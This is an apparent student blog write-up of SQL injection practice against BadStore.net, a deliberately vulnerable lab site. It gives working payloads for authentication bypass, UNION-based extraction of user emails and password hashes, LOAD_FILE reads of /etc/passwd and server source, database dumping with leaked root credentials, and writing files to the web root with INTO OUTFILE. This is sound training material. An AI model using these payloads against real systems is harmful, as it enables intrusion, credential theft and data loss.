---
layout: post
title: BadStore SQLi Writeup
---

A little while ago I went through a security course, and we were testing SQLi on BadStore.net. BadStore.net is a website created to test common web attacks on. I enjoyed practicing on it, and wanted to do a write of some of the things you can do a SQLi vulnerablility. 

I used single quote to test different fields for SQL injection vulnerability. This caused an error telling me the query had invalid syntax, and that the database was MySQL. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/error_message.png)

Since this is a practice website it gives you the query, "SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '<user input>' IN (itemnum,sdesc,ldesc)" To get all the items in the store the string "1'='1' #" can be used. This will create a true statement for the where clause, and comment the rest of the statement out. You can tell this returned everything, because there is a test item. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/all_items.png)

Other injections that could be used to do the same are: <br>
"' OR 1=1 #", closes string then makes true statement <br>
"' OR 1 #", closes string, the 1 is treated as true by MySQL <br>

A good next step is to find the version of the database being ran. To do this we need to inject a UNION statement. A UNION statement will only work if both tables have the same number of columns. To find the right number of columns we can add 1 for each extra column until there is no error. This table has 6 columns, 4 from table, image, and a check box for checkout. <br><br>
1'='1' UNION SELECT VERSION() # unions with 1 column table <br> 
1'='1' UNION SELECT VERSION(), 1 # unions with 2 column table <br>
1'='1' UNION SELECT VERSION(), 1, 1 # unions with 3 column table <br>
1'='1' UNION SELECT VERSION(), 1, 1, 1 # unions with 4 columns table <br>

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/version.png)

This tells us that the MySQL version is 4.1.7-standard. INFORMATION_SCHEMA is a good way to find all the databases, tables and columns that are in the database. Unfortunately, this was added in version 5.02 which is after BadStore's database. Instead this information needs to be guessed through trail and error. 
To start guessing table names we can use "1'='1' UNION SELECT 1, 1, 1 from <table\_name\> #". To make it easier on ourseleves the WHERE can be made false, so only the injected information shows up. Now if nothing shows up then there is no table name for the name you guessed. The first query told us the item table is called itemdb, so we can guess there might be a userdb for users. <br><br>
1'='0' UNION SELECT 1, 1, 1, 1 from userdb # <br> 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/1s_returned.png)

Now we know that there is a table called userdb. 
While testing on BadStore, if it tells you that the search bar is too short then you can use other methods. Examples are using Burpsuite to change the request outside of the form, or use curl. The maxlength can also be changed by inspecting the html form input field, and editing it in the browser. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/form_length.png)

The BadStore also passes the form input through the URL, so it can be changed there too. If puting the SQL injection into the URL, the string needs to be URL encoded. <br>
http://192.168.126.135/cgi-bin/badstore.cgi?searchquery=1%27%3D%270%27+UNION+SELECT+1%2C+1%2C+1%2C+1+from+userdb+%23+&action=search&x=0&y=0 <br>
Is the same as <br> 
1'='0' UNION SELECT 1, 1, 1, 1 from userdb # <br><br>
Some of the special charaters encoded are: <br>
' = %27 <br>
= = %3D <br>
, = %2C <br>
\# = %23 <br>
/ = %2F <br> 
\+ = space <br>

There is a table called userdb, but we need to find the column names so we can start dumping information. One way to find possible names for the columns is through the tags in the html. If we open the source for the login page and search for "INPUT TYPE", there are tags for "email", "fullname", "passwd", and "pwdhint". These can be used to start testing for column names. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/html_tags.png)

Each of the following returns information about a user. <br>
1'='0' UNION SELECT email, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT fullname, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT passwd, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT pwdhint, 1, 1, 1 from userdb # <br>

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/user_information.png)

The site will log in a user by querying the database for a username and password. If this query returns successfully then the username in the first row is used to log in the user. It doesn't matter how many rows are returned, aslong as there is one. This is why we making this query return true, will let us login to the site. 

Now we have a list of user names, emails and password hashes for BadStore. In the login page we can inject "admin' #", this sets the username as admin and comments out the password check. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/login_as_admin.png)

If we didn't have a list of the users then we could try injecting "' OR 1=1 #", which will log you in as the first user in the userdb table. For BadStore this logs you in as the test account. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/test_account.png)

Another injection to try is "' OR 1=1 ORDER BY email #", which will log you in as the first email when ordered alhaphecially. 
If you don't know the exact version of admin they are using the injection "' OR email like 'admin' #" can be used. This will return any records where the email contains admin, such as "admin", "administor", "dbadmin", or "admindb". 

If the database doesn't have an account called admin then all the accounts can be interated over until an account is found with the permissions needed. The command LIMIT can be used to return the nth row in a table. The query "' OR 1=1 LIMIT 3, 1 #", will return the 4th row in the table. The row number can be changed each time to change the user login as until you hit an error, which means there are no more users. 
The same techniques can be used to login as a supplier. <br> 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/supplier_login.png)

Another useful feature that MySQL provides is called load\_file, which will load a file from the server into the table. This can be used to load any file that the database has access to. If we wanted to read the /etc/passwd file we could inject "1'='0' UNION SELECT 1, 1, 1, LOAD_FILE('/etc/passwd') #". 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/passwd_file.png)

This will give us all the user accounts for the underlying system, which are root and nobody here. When we got an error eariler there was a path to the .cgi file, "/usr/local/apache/cgi-bin/badstore.cgi". If we didn't have this error then we could check common places files are stored on webservers, or use the URL as a guide. Lets see what is in it. <br><br>
1'='0' UNION SELECT 1, 1, 1, LOAD_FILE('/usr/local/apache/cgi-bin/badstore.cgi') # <br> 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/cgi_file.png)

This is the file the webserver uses to create the BadStore webpage. There are some interesting things we can find in this page. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/MySQL_username_passwd.png)

The username and password to the MySQL database is root and secret. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/secert_admin_portal.png)

There is a secret admin portal referenced in the code. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/cookie_format.png)

The layout of the cookie can be found here, along with the fact it checks the cookie to see if user is an admin. This information could be used to manipulate the cookie to get access to things you are supposed to be able to .<br><br>
Errors logs: <br>
h2("Recent Apache Error Log"),p,hr, \`tail /usr/local/apache/logs/error_log\` <br><br>
Location of backup database: <br>
prepare( "SELECT * FROM orderdb INTO OUTFILE '/usr/local/apache/htdocs/backup/orderdb.bak'") <br><br>
Other table names: <br>
INSERT INTO orderdb (sessid, orderdate, ordertime, ordercost, orderitems, itemlist, accountid, ipaddr, cartpaid, ccard, expdate) <br>

Cart cookie:<br>
![_config.yml]({{ site.baseurl }}/images/sqli_badstore/cart_cookie.png)

There's probably even more information you can get from the .cgi file. We know the MySQL database username and password now so we can connect directly to it instead of going through the website. 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/mysql_console.png)

The database can also be dumped using "mysqldump -h 192.168.126.135 -u root -p badstoredb > local_file"

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/database_dump.png)

If using a MySQL client version that is after 5.02 you may get the error "mysqldump: Error: 'Table 'INFORMATION\_SCHEMA.FILES' doesn't exist' when trying to dump tablespaces". This is fine, its just looking for INFORMATION_SCHEMA, but it still dumps the database. 
The database dump will give us all the tables and columns in the database, along with any information stored in them. 

BadStore allows the user to upload files to the server from the supplier page. If this wasn't available, then the MySQL function outfile could be used. This function can be used to write a field from a column into a file on the webserver. 
From the MySQL console we can issue the following commands: <br><br>
CREATE TABLE badstoredb.\`exploit\` ( \`code\` varchar(256)); <br> 
INSERT INTO badstoredb.exploit VALUES ('test exploit'); <br>
SELECT code into outfile '/usr/local/apache/cgi-bin/test.html' from badstoredb.exploit; <br> 

![_config.yml]({{ site.baseurl }}/images/sqli_badstore/uploading_file.png)

When there is a SQLi vulnerablility in a website, there is usually alot more the attacker can do than just login. Below are some of the things we did: <br>
- Log in as every user without knowing their name <br>
- Uploaded files <br>
- Read files on server <br>
- Dump database <br>
- View senstive information <br>

Things we could still do: <br>
- Execute system commands <br>
- DROP database, for DoS <br>
- Insert/Update records <br>
